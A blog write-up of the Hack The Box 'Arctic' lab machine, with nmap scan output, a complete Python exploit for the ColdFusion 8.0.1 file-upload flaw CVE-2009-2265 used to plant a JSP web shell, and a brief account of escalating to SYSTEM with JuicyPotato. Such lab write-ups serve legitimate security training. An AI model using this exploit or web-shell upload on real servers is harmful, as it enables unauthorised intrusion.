Title: HTB Arctic box writeup
Tags: oscp, htb, coldfusion, juicypotato
Summary: Per ColdFusion aspera ad another empty outdated box
Date: 2020-10-13 21:50
Status: published

# Enumeration
Looks like we've got some ColdFusion there:
```text
    Nmap 7.80 scan initiated Thu Oct  8 22:46:43 2020 as: nmap -sS -p- -oA enum/nmap-ss-all 10.10.10.11
    Nmap scan report for arctic.htb (10.10.10.11)
    Host is up (0.062s latency).
    Not shown: 65532 filtered ports
    PORT      STATE SERVICE
    135/tcp   open  msrpc
    8500/tcp  open  fmtp
    49154/tcp open  unknown
    Nmap done at Thu Oct  8 22:49:58 2020 -- 1 IP address (1 host up) scanned in 194.82 seconds
```

Scripted scan:
```text
    Nmap 7.80 scan initiated Thu Oct  8 22:51:06 2020 as: nmap -sC -A -T4 -p135,8500,49154 -oA enum/nmap-scAT4-open 10.10.10.11
    Nmap scan report for arctic.htb (10.10.10.11)
    Host is up (0.056s latency).
    PORT      STATE SERVICE VERSION
    135/tcp   open  msrpc   Microsoft Windows RPC
    8500/tcp  open  fmtp?
    49154/tcp open  msrpc   Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: phone|general purpose|specialized
    Running (JUST GUESSING): Microsoft Windows Phone|2008|7|8.1|Vista|2012 (92%)
    OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
    Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    TRACEROUTE (using port 135/tcp)
    HOP RTT      ADDRESS
    1   56.97 ms 10.10.14.1
    2   59.28 ms arctic.htb (10.10.10.11)
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done at Thu Oct  8 22:53:40 2020 -- 1 IP address (1 host up) scanned in 154.11 seconds
```
Extensions and the error tend to prove hypothesis about ColdFusion instance:

![ColdFusion err](/cstatic/htb-arctic/appcfm-error.png)

# Exploitation
Coldfusion seems to be a bit laggy and this is annoying since it slows down the
whole process. It turned out that this deployment is vulnerable to ancient
CVE-2009-2265 and I managed to find some custom written python script to exploit
that instead of using metasploit. It was found somewhere on the HTB forums and
I just tuned it up a bit so that it use the name of the local file for uploaded one.
Here's the script:
```python
#!/usr/bin/python
# Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload
# Date: 2017-10-16
# Exploit Author: Alexander Reid
# Vendor Homepage: http://www.adobe.com/products/ColdFusion-family.html
# Version: ColdFusion 8.0.1
# CVE: CVE-2009-2265 
# 
# Description: 
# A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1
# Uploads the specified jsp file to the remote server.
#
# Usage: ./exploit.py <target ip> <target port> [/path/to/ColdFusion] </path/to/payload.jsp>
# Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp
import requests, sys, os

try:
    ip = sys.argv[1]
    port = sys.argv[2]
    if len(sys.argv) == 5:
        path = sys.argv[3]
        filename = os.path.basename(sys.argv[4])
        with open(sys.argv[4], 'r') as payload:
            body=payload.read()
    else:
        path = ""
        filename = os.path.basename(sys.argv[3])
        with open(sys.argv[3], 'r') as payload:
            body=payload.read()
except IndexError:
    print 'Usage: ./exploit.py <target ip/hostname> <target port> [/path/to/ColdFusion] </path/to/payload.jsp>'
    print 'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp'
    sys.exit(-1)

basepath = "http://" + ip + ":" + port + path

print 'Sending payload...'
print 'Base filename is {}'.format(filename)

try:
    req = requests.post(
        basepath + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{}%00".format(filename),
        files={ 'newfile': ('sploit.txt', body, 'application/x-java-archive' )})
    print 'Base path is {}'.format(basepath)
    if req.status_code == 200:
        print 'Successfully uploaded payload!\nFind it at {}/userfiles/file/{}'.format(basepath, filename)
    else:
        print 'Failed to upload payload... {} {}'.format(str(req.status_code), req.reason)
except requests.Timeout:
    print 'Failed to upload payload... Request timed out'
```

The main caveat is that the uploaded JSP had to be less that 65535 bytes long,
otherwise it won't compile on the server and we will get a translation error
back while trying to run such a servlet.

So I uploaded 
[this shell](https://github.com/SecurityRiskAdvisors/cmd.jsp/blob/master/cmd.jsp),
hosted accompanying UI script on my machine and got web shell running:

![web shell](/cstatic/htb-arctic/webshell.png)

Obviously it's trivial to acquire an interactive shell from this, turned out
that ColdFusion has been running as some local user:

![user shell](/cstatic/htb-arctic/user-shell.png)

# Privilege escalation
So I decided to "try harder" with PE here, since I just watched tib3rius' course
about this on udemy. In general it seems that HTB boxes aren't much about PE
because they're pretty empty so PE relies on known exploits usually. This looks
exactly like such a case. The journey started with `winPEAS.bat` and some manual
enumeration and this resulted in nothing - the box is pretty empty. Next step
was to try some exploits suggested by `wes.py` and none of them worked well. One
was looking good, but failed to escalate privileges. I then remembered MS16-032
and tried it, but still vainly - for reason unknown it didn't work either, I
just wasn't able to catch a shell despite the fact that exploit reported success.
The only thing that worked was the JuicyPotato - flawlessly spawned SYSTEM shell:

![root shell](/cstatic/htb-arctic/root-shell.png)
